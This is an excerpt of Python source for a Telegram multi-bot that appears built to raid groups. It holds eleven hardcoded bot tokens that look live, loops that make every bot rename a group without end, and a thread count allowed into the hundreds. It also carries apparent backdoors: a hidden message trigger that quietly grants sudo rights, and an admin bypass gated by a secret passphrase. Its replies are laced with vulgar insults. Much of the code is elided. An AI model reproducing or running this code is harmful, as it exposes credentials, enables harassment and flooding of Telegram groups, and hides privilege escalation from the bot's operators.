...
# CONFIG
# ---------------------------
TOKENS = [ "8966737003:AAHtRcATawdxJSANmDSbjUKa9qhSAhayWFU" , "8473081376:AAHwGDCUgTrY1tlS7urrlzwU9htR0FT-4wM" , "8824291861:AAFYpZaV8j0_ARAOH34h8rhYWA6AmMvQJcE" , "8937229505:AAGOYyZdoiXVEv6aybN5fxJ7_R_cBTcKVq8" , "8907726550:AAEBiHIjcQPOcUcGXK5Pg_fA0Xzk-gxnhSI" , "8946646015:AAF7krV_tH6dL_w4hZweZ8AvLjSCHxCIPn8" , "8091275354:AAHsZO45bz6m2ctZCQSnQjEga1-TowUdMY8" , "8841569513:AAHNrFd7go1D0W9FIPizXQO13y_02BdMnVw" , "8807816791:AAE9NNGwUKXgnHa7Pwtd6yG4lgiBOFu2J28" , "8734612907:AAE_ktKyu0qsMhibP-gnmTbW6int8bdrtUM" , "8675702631:AAHohYK7t4ChWXQH6_9zxQSc3_dkbifVcBQ" ,
]

OWNER_IDS = [8895537848]
ADMINS_FILE = "admin_ids.json"
GROUPS_FILE = "monitored_groups.json"
SUDO_FILE = "sudo.json"
UNAUTHORIZED_MESSAGE = "𝐁ɪɴᴀ 𝐙xʏɴ 𝐁ᴀᴀᴘ 𝐊 𝐏ᴇʀᴍɪꜱꜱɪᴏɴ 𝐊 𝐂ᴏᴍᴍᴀɴᴅ 𝐊ᴇꜱᴇ 𝐔ꜱᴇ 𝐊ᴀʀᴀ 𝐑ɴᴅʏᴋᴇ 𝐁ᴀᴄᴄʜᴇ ~😡🖕"
...
_GNC_STYLE_ORDER = ["zxyn", "aesthetic", "dark", "cute", "neon", "gamer", "mythic", "glitch", "soft", "crown"]
...
"🔱 ═══════════════════════ 🔱\n"
"     👑 𝐙xʏɴ (𝗣𝗔𝗣𝗔) 👑\n"
"   ⚔️ 𝐌𝐔𝐋𝐓𝐈-𝐁𝐎𝐓 𝐋𝐎𝐀𝐃𝐄𝐃 ⚔️\n"
"🔱 ═══════════════════════ 🔱\n\n"
"📜 𝐔𝐬𝐞 ➜ /𝐡𝐞𝐥𝐩\n"
"✨ 𝐓𝐨 𝐕𝐢𝐞𝐰 𝐀𝐥𝐥 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬\n\n"
"🔱 𝐑𝐄𝐒𝐏𝐄𝐂𝐓 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑 • 𝐙xʏɴ 🔱"
)

@only_sudo
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """╔══════════════════════════════════════════════╗
║          ☠️ 𝐑𝐄𝐒𝐏𝐄𝐂𝐓 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑 ☠️
║             👑 『 𝐙xʏɴ (𝗣𝗔𝗣𝗔) 』 👑
╚══════════════════════════════════════════════╝

          ⚔️ 𝐙xʏɴ 𝐁ᴏᴛ 𝐕𝟐 • 𝐔ʟᴛʀᴀ 𝐄ᴅɪᴛɪᴏɴ ⚔️
      『 💀 𝐀𝐋𝐋 𝐇𝐀𝐈𝐋 𝐓𝐇𝐄 𝐅𝐀𝐓𝐇𝐄𝐑 💀 』
    ...
    if update.message.text and update.message.from_user:
        ...
        if _st:
            ...
            if uid not in SUDO_USERS:
                ...
                save_sudo()
            await update.message.reply_text("𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁𝐚𝐜𝐤 𝐙xʏɴ~")
...
async def threads_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        if 1 <= val <= MAX_THREADS:
            ...
            if val > 250:
                await update.message.reply_text("𝐀𝐁𝐁 𝐇𝐀𝐓𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐈 𝟗𝟗𝟗𝐊𝐌 𝐊𝐄 𝐑𝐀𝐅𝐓𝐀𝐀𝐑 𝐒𝐄 𝐇𝐎𝐆𝐈 ~ 𝐙xʏɴ 𝗚𝗢𝗗 𝗛𝗔𝗜 !!")
...
async def owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("@g0dsg 𝗣𝗔𝗣𝗔 𝗝𝗜 𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗜 𝗠𝗘𝗥𝗘 ~ 💋👑\n𝐙xʏɴ ~ 😍👑")
...
@only_sudo
async def zxynnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()

    async def zxyn_loop(bot, c, b):
        while True:
            try:
    ...
    group_tasks[cid] = [asyncio.create_task(zxyn_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("🩸𝐙xʏɴ 𝐒ᴡᴏʀᴅ (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

async def adminbyp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or (context.args[0] != "𝐙xʏɴ 𝐒ᴡᴏʀᴅ" and context.args[0] != "ogfyter"):
        return
...
async def gnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    gnc_cache[uid] = text
    formatted = _gnc_format(text, "zxyn")
...
def build_app(token):
    ...
    handlers = [
        ...
        CommandHandler("timenc", timenc_cmd), CommandHandler("zxynnc", zxynnc_cmd),
